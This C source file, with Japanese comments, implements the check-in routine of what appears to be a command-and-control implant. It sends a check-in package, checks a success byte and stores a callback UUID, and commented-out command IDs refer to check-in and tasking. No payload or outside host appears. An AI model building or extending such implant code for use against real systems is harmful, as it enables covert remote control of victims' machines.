#include "checkin.h"

// TODO:commandIDをtranlaterと一致させる。

//comandID =
/*
#define CMD_CHECKIN     0x01
#define CMD_GET_TASKING 0x04
#define CMD_RESPONSE    0x05
*/


BOOL sendCheckin(PCONFIG_CORN corn){
    // ! メモリを確保
    PPackage Checkin = newPackage(TRUE, checkin);

    // ! メモリ確保
    PParser response = sendAndReceive(Checkin->buffer, Checkin->size);

    // ! Packageメモリ解放
    freePackage(Checkin);

    if(!response){
        return FALSE;
    }

    SIZE_T szSuccess = 1;
    SIZE_T szCallBackUUID = 36;

    PBYTE pSuccess = getByte(response, &szSuccess);
    BYTE success = *pSuccess;
    LocalFree(pSuccess);

    if(success == 0x00){
    freeParser(response);
    return FALSE;
    }


    PBYTE callBackUUID = getByte(response, &szCallBackUUID);
    memcpy(corn->callBackuuid, callBackUUID, 36);

    LocalFree(callBackUUID);
    
    // ! メモリ解放
    freeParser(response);

    return TRUE;
}

